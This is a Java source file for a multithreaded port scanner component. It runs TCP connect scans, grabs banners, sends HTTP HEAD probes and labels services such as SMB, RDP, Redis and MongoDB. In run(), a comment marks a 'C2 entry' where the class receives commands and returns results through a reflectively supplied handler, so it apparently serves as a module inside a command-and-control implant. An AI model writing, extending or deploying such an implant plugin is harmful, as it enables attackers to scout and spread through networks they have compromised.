package org.leo.core.component;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 端口扫描组件
 * 提供多线程异步端口扫描功能，兼容Java 1.5+
 *
 * @author LeoSpring
 * @version 2.1
 */
public class PortScanComponent implements Runnable, ThreadFactory {

    private static final int MAX_THREADS = 64;
    private static final int MAX_TASKS = 64;
    private static final int MAX_TARGETS = 128;
    private static final int MAX_PORTS = 4096;
    private static final int MAX_WORK_ITEMS = 65536;
    private static final int MAX_TIMEOUT_MS = 300000;
    private static final int MAX_PROBE_READ_BYTES = 8192;
    private static final int MAX_PROBE_TIMEOUT_MS = 1500;
    private static final long STOPPED_TASK_TTL_MILLIS = 30L * 60L * 1000L;
    private static final AtomicInteger THREAD_SEQUENCE = new AtomicInteger();

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;


    // 存储所有扫描任务的状态和结果
    private static ConcurrentHashMap scanTasks = new ConcurrentHashMap();
    
    // 存储每个任务的锁对象（用于暂停/继续）
    private static ConcurrentHashMap taskLocks = new ConcurrentHashMap();
    
    // 扫描任务状态常量
    private static final String STATE_RUNNING = "RUNNING";
    private static final String STATE_PAUSED = "PAUSED";
    private static final String STATE_STOPPED = "STOPPED";


    // 用于单个端口扫描的实例变量
    private String scanHost;
    private Integer scanPort;
    private int scanTimeout;

    private String taskId;
    private boolean workerMode;
    private String threadSeed;



    



    public void invoke() throws Exception {
        cleanupStoppedTasks();
        Object methodObj = params.get("methodName");
        if (!(methodObj instanceof String)) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "methodName required");
            return;
        }
        String methodName = (String) methodObj;
        if ("startScan".equals(methodName)){
            String taskId=startScan(params);
            results.put("taskId",taskId);
            results.put("code",200);
        } else if ("queryResult".equals(methodName)){
            String taskId= (String) params.get("taskId");
            HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
            if (scanTaskInfo == null) {
                results.put("code", Integer.valueOf(404));
                results.put("msg", "任务不存在");
                return;
            }
            Object taskLock = taskLocks.get(taskId);
            HashMap snapshot;
            if (taskLock != null) {
                synchronized (taskLock) {
                    snapshot = new HashMap(scanTaskInfo);
                }
            } else {
                snapshot = new HashMap(scanTaskInfo);
            }
            AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
            Integer completed = Integer.valueOf(completedCount != null ? completedCount.get() : 0);
            snapshot.put("scannedCount", completed);
            snapshot.put("completedCount", completed);
            snapshot.remove("executor");
            List ports = (List) scanTaskInfo.get("openPortList");
            if (ports != null) {
                synchronized (ports) {
                    snapshot.put("openPortList", new ArrayList(ports));
                }
            }
            List openPortResults = (List) scanTaskInfo.get("openPortResults");
            if (openPortResults != null) {
                synchronized (openPortResults) {
                    snapshot.put("openPortResults", new ArrayList(openPortResults));
                }
            }
            List serviceResults = (List) scanTaskInfo.get("serviceResults");
            if (serviceResults != null) {
                synchronized (serviceResults) {
                    snapshot.put("serviceResults", new ArrayList(serviceResults));
                    snapshot.put("results", new ArrayList(serviceResults));
                }
            }
            results.put("scanTaskInfo",snapshot);
            results.put("code",200);
        } else if ("pauseScan".equals(methodName)){
            String taskId= (String) params.get("taskId");
            pauseScan(taskId);
            results.put("code",200);
            results.put("msg","暂停扫描成功");
        } else if ("resumeScan".equals(methodName)){
            String taskId= (String) params.get("taskId");
            resumeScan(taskId);
            results.put("code",200);
            results.put("msg","继续扫描成功");
        } else if ("stopScan".equals(methodName)){
            String taskId= (String) params.get("taskId");
            stopScan(taskId);
            results.put("code",200);
            results.put("msg","终止扫描成功");
        } else {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "未知 methodName: " + methodName);
        }

    }

    public PortScanComponent() {
    }

    public PortScanComponent(String scanHost, Integer scanPort, int scanTimeout, String taskId) {
        this.scanHost = scanHost;
        this.scanPort = scanPort;
        this.scanTimeout = scanTimeout;
        this.taskId=taskId;
        this.workerMode = true;
    }

    @Override
    public void run() {
        // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
        if (!workerMode) {
            java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
            try {
                params = (java.util.HashMap) h.invoke(null, null, null);
                results = new java.util.HashMap();
                invoke();
            } catch (Throwable t) {
                if (results == null) results = new java.util.HashMap();
                results.put("code", Integer.valueOf(500));
                results.put("msg", t.getMessage());
            }
            if (results != null) {
                try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
            }
            return;
        }
        HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            return; // 任务不存在，直接返回
        }
        
        // 获取任务的锁对象
        Object lock = taskLocks.get(taskId);
        if (lock == null) {
            lock = new Object();
            Object existing = taskLocks.putIfAbsent(taskId, lock);
            if (existing != null) {
                lock = existing;
            }
        }
        
        // 等待直到任务状态为运行中或已终止
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            while (STATE_PAUSED.equals(status)) {
                try {
                    lock.wait(); // 暂停时等待
                    status = (String) scanTaskInfo.get("status");
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
            
            // 如果已终止，直接返回
            if (STATE_STOPPED.equals(status)) {
                return;
            }
        }
        
        // 执行扫描
        List openPortList= (List) scanTaskInfo.get("openPortList");
        List openPortResults = (List) scanTaskInfo.get("openPortResults");
        List serviceResults = (List) scanTaskInfo.get("serviceResults");
        AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
        int portLength=((Number) scanTaskInfo.get("portLength")).intValue();
        boolean probeServices = Boolean.TRUE.equals(scanTaskInfo.get("probeServices"));

        synchronized (lock) {
            if (STATE_STOPPED.equals(scanTaskInfo.get("status"))) return;
        }

        // 再次检查状态（可能在等待期间被终止）
        int count;
        try {
            boolean open = scanPort(scanHost,scanPort,scanTimeout);
            HashMap serviceResult = open && probeServices
                    ? probeService(scanHost, scanPort.intValue(), scanTimeout) : null;
            synchronized (lock) {
                if (open && !STATE_STOPPED.equals(scanTaskInfo.get("status"))) {
                    openPortList.add(scanPort);
                    if (openPortResults != null) {
                        openPortResults.add(serviceResult != null
                                ? serviceResult : createOpenPortResult(scanHost, scanPort.intValue()));
                    }
                    if (serviceResults != null && probeServices) {
                        serviceResults.add(serviceResult != null
                                ? serviceResult : createOpenPortResult(scanHost, scanPort.intValue()));
                    }
                }
            }
        } finally {
            // 即使单个任务异常也必须推进计数，避免任务永久停在 RUNNING。
            count = completedCount.incrementAndGet();
        }
        // 使用同步块确保状态更新的原子性
        synchronized (lock) {
            if (count >= portLength){
                finishTask(scanTaskInfo, false);
            }
        }
    }


    private String startScan(HashMap params){
        cleanupStoppedTasks();
        if (scanTasks.size() >= MAX_TASKS) {
            throw new IllegalStateException("too many scan tasks, max=" + MAX_TASKS);
        }
        List scanHosts = normalizeScanHosts(params);
        int[] scanPorts = normalizeScanPorts(params.get("scanPorts"));
        long workItemCount = (long) scanHosts.size() * (long) scanPorts.length;
        if (workItemCount > MAX_WORK_ITEMS) {
            throw new IllegalArgumentException("目标与端口组合不能超过" + MAX_WORK_ITEMS + "项");
        }
        boolean probeServices = parseBoolean(params.get("probeServices"), true);
        int scanTimeout= params.get("scanTimeout") instanceof Number
                ? ((Number) params.get("scanTimeout")).intValue() : 3000;
        if (scanTimeout <= 0) scanTimeout = 3000;
        if (scanTimeout > MAX_TIMEOUT_MS) scanTimeout = MAX_TIMEOUT_MS;
        int threadsNum= params.get("threadsNum") instanceof Number
                ? ((Number) params.get("threadsNum")).intValue() : 10;
        if (threadsNum <= 0) threadsNum = 1;
        if (threadsNum > MAX_THREADS) threadsNum = MAX_THREADS;
        if (threadsNum > workItemCount) threadsNum = (int) workItemCount;
        HashMap scanTaskInfo=new HashMap();
        String taskId=UUID.randomUUID().toString();
        threadSeed = String.valueOf(params.get("hostId")) + "|" + taskId;
        ExecutorService pool = Executors.newFixedThreadPool(threadsNum, this);
        scanTaskInfo.put("taskId",taskId);
        scanTaskInfo.put("resultVersion", Integer.valueOf(1));
        scanTaskInfo.put("scanKind", "discovery");
        scanTaskInfo.put("scanStage", probeServices ? "PORT_AND_SERVICE" : "PORT");
        List targetMetadata = new ArrayList();
        for (Object host : scanHosts) {
            HashMap target = new HashMap();
            target.put("host", host);
            target.put("protocol", "tcp");
            target.put("source", "port-scan");
            targetMetadata.add(target);
        }
        scanTaskInfo.put("target", targetMetadata.get(0));
        scanTaskInfo.put("targets", targetMetadata);
        scanTaskInfo.put("targetCount", Integer.valueOf(targetMetadata.size()));
        scanTaskInfo.put("portsPerTarget", Integer.valueOf(scanPorts.length));
        scanTaskInfo.put("scanHost", scanHosts.size() == 1 ? scanHosts.get(0) : null);
        scanTaskInfo.put("scanHosts", new ArrayList(scanHosts));
        scanTaskInfo.put("scanPorts", scanPorts);
        scanTaskInfo.put("status", STATE_RUNNING); // 使用status记录状态，初始为运行中
        scanTaskInfo.put("portLength",Integer.valueOf((int) workItemCount));
        scanTaskInfo.put("probeServices", Boolean.valueOf(probeServices));
        scanTaskInfo.put("createdAt", Long.valueOf(System.currentTimeMillis()));
        // 为任务创建锁对象
        taskLocks.put(taskId, new Object());
        // 使用线程安全的列表
        scanTaskInfo.put("openPortList",Collections.synchronizedList(new ArrayList()));
        scanTaskInfo.put("openPortResults",Collections.synchronizedList(new ArrayList()));
        scanTaskInfo.put("serviceResults",Collections.synchronizedList(new ArrayList()));
        // 使用原子计数器跟踪已完成的扫描数量
        scanTaskInfo.put("completedCount",new AtomicInteger(0));
        scanTaskInfo.put("executor", pool);
        scanTasks.put(taskId,scanTaskInfo);
        try {
            for (Object host : scanHosts) {
                for (int i = 0; i < scanPorts.length; i++) {
                    pool.execute(new PortScanComponent(String.valueOf(host), scanPorts[i], scanTimeout, taskId));
                }
            }
        } catch (RuntimeException e) {
            pool.shutdownNow();
            scanTasks.remove(taskId);
            taskLocks.remove(taskId);
            throw e;
        }
        pool.shutdown();
        return taskId;
    }

    private static int[] normalizeScanPorts(Object value) {
        if (value == null) throw new IllegalArgumentException("scanPorts 不能为空");
        int inputSize;
        if (value instanceof int[]) inputSize = ((int[]) value).length;
        else if (value instanceof List) inputSize = ((List) value).size();
        else if (value.getClass().isArray()) inputSize = java.lang.reflect.Array.getLength(value);
        else throw new IllegalArgumentException("scanPorts必须是端口数组");
        if (inputSize == 0) throw new IllegalArgumentException("scanPorts 不能为空");
        if (inputSize > MAX_PORTS) {
            throw new IllegalArgumentException("scanPorts不能超过" + MAX_PORTS + "个");
        }
        LinkedHashSet normalizedPorts = new LinkedHashSet();
        for (int i = 0; i < inputSize; i++) {
            Object item = value instanceof List
                    ? ((List) value).get(i)
                    : value instanceof int[]
                            ? Integer.valueOf(((int[]) value)[i])
                            : java.lang.reflect.Array.get(value, i);
            int port;
            try {
                port = item instanceof Number
                        ? ((Number) item).intValue()
                        : Integer.parseInt(String.valueOf(item).trim());
            } catch (RuntimeException error) {
                throw new IllegalArgumentException("scanPorts[" + i + "]必须是整数", error);
            }
            if (port < 1 || port > 65535) {
                throw new IllegalArgumentException("端口超出范围: " + port);
            }
            normalizedPorts.add(Integer.valueOf(port));
        }
        int[] ports = new int[normalizedPorts.size()];
        int index = 0;
        for (Object port : normalizedPorts) ports[index++] = ((Integer) port).intValue();
        return ports;
    }

    private static List normalizeScanHosts(HashMap params) {
        Object value = params.get("scanHosts");
        LinkedHashSet hosts = new LinkedHashSet();
        if (value instanceof List) {
            List values = (List) value;
            for (Object item : values) {
                if (item == null) continue;
                String host = String.valueOf(item).trim();
                if (host.length() == 0) continue;
                validateScanHost(host);
                hosts.add(host);
            }
        } else if (value != null) {
            throw new IllegalArgumentException("scanHosts必须是主机地址数组");
        }
        if (hosts.isEmpty()) {
            Object legacy = params.get("scanHost");
            if (legacy == null) throw new IllegalArgumentException("scanHost 不能为空");
            String host = String.valueOf(legacy).trim();
            if (host.length() == 0) throw new IllegalArgumentException("scanHost 不能为空");
            validateScanHost(host);
            hosts.add(host);
        }
        if (hosts.size() > MAX_TARGETS) {
            throw new IllegalArgumentException("scanHosts不能超过" + MAX_TARGETS + "个");
        }
        return new ArrayList(hosts);
    }

    private static void validateScanHost(String host) {
        if (host.length() > 253 || host.indexOf('\r') >= 0 || host.indexOf('\n') >= 0) {
            throw new IllegalArgumentException("scanHost格式无效");
        }
        for (int i = 0; i < host.length(); i++) {
            if (Character.isWhitespace(host.charAt(i))) {
                throw new IllegalArgumentException("scanHost不能包含空白字符");
            }
        }
    }

    private static boolean parseBoolean(Object value, boolean defaultValue) {
        if (value == null) return defaultValue;
        if (value instanceof Boolean) return ((Boolean) value).booleanValue();
        String text = String.valueOf(value).trim();
        if ("true".equalsIgnoreCase(text)) return true;
        if ("false".equalsIgnoreCase(text)) return false;
        throw new IllegalArgumentException("probeServices必须是布尔值");
    }

    public Thread newThread(Runnable task) {
        Thread thread = new Thread(task, workerThreadName(threadSeed));
        thread.setDaemon(true);
        return thread;
    }

    private static String workerThreadName(String seed) {
        return "worker-" + Integer.toHexString(String.valueOf(seed).hashCode()) + "-"
                + THREAD_SEQUENCE.incrementAndGet();
    }

    private Boolean scanPort(String host,int port,int scanTimeout){
        Socket socket = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(host, port), scanTimeout);
            return true;
        } catch (Exception var14) {
            return false;
        }finally {
            if (socket != null) {
                try { socket.close(); } catch (Exception ignored) {}
            }
        }
    }

    private static HashMap createOpenPortResult(String host, int port) {
        HashMap result = new HashMap();
        result.put("host", host);
        result.put("port", Integer.valueOf(port));
        result.put("transport", "tcp");
        result.put("state", "open");
        result.put("service", inferService(port));
        result.put("confidence", Double.valueOf(inferService(port) == null ? 0.1D : 0.35D));
        result.put("probe", "connect");
        return result;
    }

    /**
     * Performs a bounded, read-only service probe after a TCP connection succeeds.
     * The original openPortList remains the compatibility result; this richer list
     * is the first stage of the unified asset result model.
     */
    private static HashMap probeService(String host, int port, int scanTimeout) {
        HashMap result = createOpenPortResult(host, port);
        String probeHost = host.replace("\r", "").replace("\n", "");
        String inferred = inferService(port);
        boolean httpProbe = isHttpPort(port);
        int timeout = Math.max(100, Math.min(MAX_PROBE_TIMEOUT_MS, scanTimeout));
        Socket socket = null;
        InputStream input = null;
        OutputStream output = null;
        try {
            socket = new Socket();
            socket.connect(new InetSocketAddress(probeHost, port), timeout);
            socket.setSoTimeout(timeout);
            if (httpProbe) {
                output = socket.getOutputStream();
                output.write(("HEAD / HTTP/1.0\r\nHost: " + probeHost
                        + "\r\nUser-Agent: LeoAi-Scanner/1.0\r\nConnection: close\r\n\r\n")
                        .getBytes(StandardCharsets.ISO_8859_1));
                output.flush();
                result.put("probe", "http-head");
            } else {
                result.put("probe", "banner");
            }
            input = socket.getInputStream();
            byte[] bytes = readProbe(input);
            if (bytes.length > 0) {
                String banner = sanitizeBanner(new String(bytes, StandardCharsets.ISO_8859_1));
                result.put("banner", banner);
                if (httpProbe && banner.startsWith("HTTP/")) {
                    result.put("service", port == 443 || port == 8443 ? "https" : "http");
                    result.put("scheme", port == 443 || port == 8443 ? "https" : "http");
                    result.put("confidence", Double.valueOf(0.9D));
                    parseHttpHeaders(result, banner);
                } else if (inferred == null) {
                    result.put("service", inferBannerService(banner));
                    result.put("confidence", Double.valueOf(0.65D));
                } else {
                    result.put("confidence", Double.valueOf(0.75D));
                }
            }
        } catch (Exception error) {
            result.put("probeError", error.getClass().getSimpleName());
        } finally {
            closeQuietly(output);
            closeQuietly(input);
            closeQuietly(socket);
        }
        return result;
    }

    private static byte[] readProbe(InputStream input) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] chunk = new byte[1024];
        int remaining = MAX_PROBE_READ_BYTES;
        while (remaining > 0) {
            int count = input.read(chunk, 0, Math.min(chunk.length, remaining));
            if (count < 0) break;
            if (count == 0) continue;
            buffer.write(chunk, 0, count);
            remaining -= count;
            if (count < chunk.length) break;
        }
        return buffer.toByteArray();
    }

    private static void parseHttpHeaders(HashMap result, String banner) {
        String[] lines = banner.split("\\r?\\n");
        if (lines.length > 0) {
            String[] status = lines[0].split(" ", 3);
            if (status.length > 1) {
                try { result.put("statusCode", Integer.valueOf(status[1])); }
                catch (NumberFormatException ignored) { }
            }
        }
        for (int i = 1; i < lines.length; i++) {
            int colon = lines[i].indexOf(':');
            if (colon <= 0) continue;
            String name = lines[i].substring(0, colon).trim();
            String value = lines[i].substring(colon + 1).trim();
            if ("server".equalsIgnoreCase(name)) result.put("server", value);
            if ("location".equalsIgnoreCase(name)) result.put("location", value);
        }
    }

    private static String sanitizeBanner(String banner) {
        StringBuilder out = new StringBuilder(Math.min(banner.length(), 4096));
        for (int i = 0; i < banner.length() && out.length() < 4096; i++) {
            char ch = banner.charAt(i);
            if (ch == '\t' || ch == '\r' || ch == '\n' || (ch >= 32 && ch != 127)) out.append(ch);
        }
        return out.toString().trim();
    }

    private static String inferBannerService(String banner) {
        String value = banner.toLowerCase(Locale.ENGLISH);
        if (value.startsWith("ssh-")) return "ssh";
        if (value.startsWith("220 ") && value.contains("ftp")) return "ftp";
        if (value.startsWith("+ok")) return "pop3";
        return "unknown";
    }

    private static String inferService(int port) {
        switch (port) {
            case 21: return "ftp";
            case 22: return "ssh";
            case 23: return "telnet";
            case 25: return "smtp";
            case 53: return "dns";
            case 80: case 81: case 3000: case 8000: case 8001: case 8080:
            case 8081: case 8888: case 9000: case 9090: return "http";
            case 110: return "pop3";
            case 143: return "imap";
            case 443: case 8443: return "https";
            case 445: return "smb";
            case 1433: return "mssql";
            case 1521: return "oracle";
            case 3306: return "mysql";
            case 3389: return "rdp";
            case 5432: return "postgresql";
            case 5900: case 5901: return "vnc";
            case 6379: return "redis";
            case 9200: return "elasticsearch";
            case 11211: return "memcached";
            case 27017: case 27018: return "mongodb";
            default: return null;
        }
    }

    private static boolean isHttpPort(int port) {
        return port == 80 || port == 81 || port == 3000 || port == 8000 || port == 8001
                || port == 8080 || port == 8081 || port == 8888 || port == 9000 || port == 9090;
    }

    private static void closeQuietly(Object resource) {
        try {
            if (resource instanceof InputStream) ((InputStream) resource).close();
            else if (resource instanceof OutputStream) ((OutputStream) resource).close();
            else if (resource instanceof Socket) ((Socket) resource).close();
        } catch (Exception ignored) { }
    }
    
    /**
     * 暂停扫描任务
     */
    private void pauseScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        Object lock = taskLocks.get(taskId);
        if (lock == null) throw new Exception("任务锁不存在");
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止，无法暂停");
            if (STATE_PAUSED.equals(status)) throw new Exception("任务已处于暂停状态");
            scanTaskInfo.put("status", STATE_PAUSED);
        }
    }
    
    /**
     * 继续扫描任务
     */
    private void resumeScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        Object lock = taskLocks.get(taskId);
        if (lock == null) throw new Exception("任务锁不存在");
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止，无法继续");
            if (STATE_RUNNING.equals(status)) throw new Exception("任务正在运行中，无需继续");
            scanTaskInfo.put("status", STATE_RUNNING);
            lock.notifyAll(); // 唤醒所有等待的线程
        }
    }
    
    /**
     * 终止扫描任务
     */
    private void stopScan(String taskId) throws Exception {
        HashMap scanTaskInfo = (HashMap) scanTasks.get(taskId);
        if (scanTaskInfo == null) {
            throw new Exception("任务不存在");
        }
        Object lock = taskLocks.get(taskId);
        if (lock == null) throw new Exception("任务锁不存在");
        synchronized (lock) {
            String status = (String) scanTaskInfo.get("status");
            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止");
        }
        finishTask(scanTaskInfo, true);
    }

    private static void finishTask(HashMap scanTaskInfo, boolean interrupt) {
        Object taskId = scanTaskInfo.get("taskId");
        Object lock = taskLocks.get(taskId);
        Object monitor = lock != null ? lock : scanTaskInfo;
        ExecutorService executor;
        synchronized (monitor) {
            scanTaskInfo.put("status", STATE_STOPPED);
            if (scanTaskInfo.get("finishedAt") == null) {
                scanTaskInfo.put("finishedAt", Long.valueOf(System.currentTimeMillis()));
            }
            executor = (ExecutorService) scanTaskInfo.remove("executor");
            monitor.notifyAll();
        }
        if (interrupt && executor != null) executor.shutdownNow();
    }

    private void cleanupStoppedTasks() {
        long now = System.currentTimeMillis();
        Iterator it = ((Map) scanTasks).keySet().iterator();
        while (it.hasNext()) {
            Object id = it.next();
            Map task = (Map) scanTasks.get(id);
            if (task == null || !STATE_STOPPED.equals(task.get("status"))) continue;
            Object finishedObj = task.get("finishedAt");
            long age = finishedObj instanceof Number
                    ? now - ((Number) finishedObj).longValue() : -1L;
            if (age >= 0 && age > STOPPED_TASK_TTL_MILLIS) {
                scanTasks.remove(id);
                taskLocks.remove(id);
            }
        }
    }
}
